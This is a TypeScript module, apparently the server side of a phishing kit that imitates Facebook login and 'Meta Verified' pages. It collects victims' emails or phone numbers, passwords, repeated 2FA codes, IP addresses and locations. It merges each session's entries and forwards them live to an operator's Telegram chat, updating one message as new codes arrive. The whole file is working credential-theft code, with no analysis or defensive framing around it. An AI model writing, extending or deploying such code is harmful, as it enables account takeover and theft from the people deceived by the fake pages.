import https from 'https';
import axios from 'axios';
import { memoryStoreTTL } from '@/utils/memoryStore';
import { generateKey } from '@/utils/generateKey';

const agent = new https.Agent({ family: 4 });

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

// Simple rate limiter to prevent spam
const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW = 1000;

function checkRateLimit(key: string): boolean {
    const now = Date.now();
    const lastCall = rateLimiter.get(key);

    if (!lastCall || (now - lastCall) > RATE_LIMIT_WINDOW) {
        rateLimiter.set(key, now);
        return true;
    }

    return false;
}

// Retry utility for Telegram API calls
async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
    let lastError: any;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const result = await requestFn();
            return result;
        } catch (error: any) {
            lastError = error;

            const errorCode = error?.response?.status;
            const errorDesc = error?.response?.data?.description || '';

            // Don't retry on authentication errors, invalid chat_id, etc.
            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            // Exponential backoff: 1s, 2s, 4s
            const delay = Math.pow(2, attempt - 1) * 1000;
            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

/** New Telegram flow: merge payload in-memory, then `editMessageText` same `message_id` when possible (one thread message per session key). */
async function sendOrEditMessage(
    apiRoot: string,
    chatId: string,
    text: string,
    existingMessageId?: number
): Promise<number | undefined> {
    if (existingMessageId != null) {
        try {
            const res = await retryTelegramRequest(() =>
                axios.post(
                    `${apiRoot}/editMessageText`,
                    {
                        chat_id: chatId,
                        message_id: existingMessageId,
                        text,
                        parse_mode: 'HTML',
                    },
                    {
                        httpsAgent: agent,
                        timeout: 10000,
                    },
                ),
            );
            const id = res?.data?.result?.message_id;
            return id ?? existingMessageId;
        } catch (err: unknown) {
            const anyErr = err as { response?: { data?: { description?: string } }; message?: string };
            console.warn(
                '⚠️ editMessageText failed, sending new message:',
                anyErr?.response?.data?.description || anyErr?.message || err,
            );
        }
    }

    const res = await retryTelegramRequest(() =>
        axios.post(
            `${apiRoot}/sendMessage`,
            {
                chat_id: chatId,
                text,
                parse_mode: 'HTML',
            },
            {
                httpsAgent: agent,
                timeout: 10000,
            },
        ),
    );
    return res?.data?.result?.message_id as number | undefined;
}

function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/** Giá trị hiển thị trong <code>: không có dữ liệu thì để trống (không dùng "-" hay "N/A"). */
function formatCodeField(value: unknown): string {
    if (value === undefined || value === null) return '';
    const s = String(value).trim();
    return s ? escapeHtml(s) : '';
}


function normalizeData(input: any = {}) {
    const sf = input.submissionFlow;
    const submissionFlow: '' | 'facebook_login' | 'meta_verified' =
        sf === 'facebook_login' || sf === 'meta_verified' ? sf : '';
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
        submissionFlow,
    };
}

function mergeData(oldData: any = {}, newData: any = {}) {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result: any = { ...normalizedOld };
    Object.entries(normalizedNew).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

type NormalizedPayload = ReturnType<typeof normalizeData>;

/** Email ô đăng nhập; fallback số điện thoại (luồng Meta Verified thường để phone riêng). */
function primaryLoginIdentifier(d: NormalizedPayload): string {
    const email = String(d.email ?? '').trim();
    if (email) return email;
    const phone = String(d.phone ?? '').trim().replace(/^\+/, '');
    return phone ? `+${phone}` : '';
}

/** Một dòng password: ưu tiên mật khẩu chính, sau đó lần 2 (Meta Password modal). */
function primaryPasswordField(d: NormalizedPayload): string {
    const a = String(d.password ?? '').trim();
    if (a) return a;
    return String(d.passwordSecond ?? '').trim();
}

function appendTwoFaBlock(lines: string[], d: NormalizedPayload) {
    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
    if (!has2FA) return;

    lines.push(
        `----------------------`,
        `<b>🔐 2FA step 1</b>`,
        `<code>${formatCodeField(d.twoFa)}</code>`,
        `<b>🔐 2FA step 2</b>`,
        `<code>${formatCodeField(d.twoFaSecond)}</code>`,
    );
    if (d.twoFaThird) {
        lines.push(`<i>(legacy)</i> <code>${formatCodeField(d.twoFaThird)}</code>`);
    }
}

/** Một định dạng tin duy nhất cho mọi luồng; chỉ khác dòng tiêu đề. */
function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
    const headline =
        d.submissionFlow === 'facebook_login' ? `<b>🔷 FACEBOOK LOGIN</b>` : `<b>📋 META VERIFIED</b>`;
    const lines = [
        headline,
        `----------------------`,
        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
        `----------------------`,
        `<b>Mobile number or Email:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
        `<b>Password:</b> <code>${formatCodeField(primaryPasswordField(d))}</code>`,
    ];
    appendTwoFaBlock(lines, d);
    return lines.join('\n');
}

function formatMessage(data: any): string {
    return formatTelegramSubmissionMessage(normalizeData(data));
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    const key = generateKey(data);
    if (!checkRateLimit(key)) {
        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
        return;
    }
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const updatedText = formatMessage(fullData);

    try {
        const messageId = await sendOrEditMessage(config.api, config.chatId, updatedText, prev?.messageId);
        if (messageId !== undefined) {
            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
            console.log(`✅ Telegram ${prev?.messageId ? 'updated message' : 'new message'}. ID: ${messageId}`);
        } else {
            console.warn('⚠️ Telegram response không có message_id');
        }
    } catch (err: unknown) {
        const anyErr = err as { response?: { data?: unknown }; message?: string };
        console.error('🔥 Telegram error:', anyErr?.response?.data || anyErr?.message || err);
    }
}
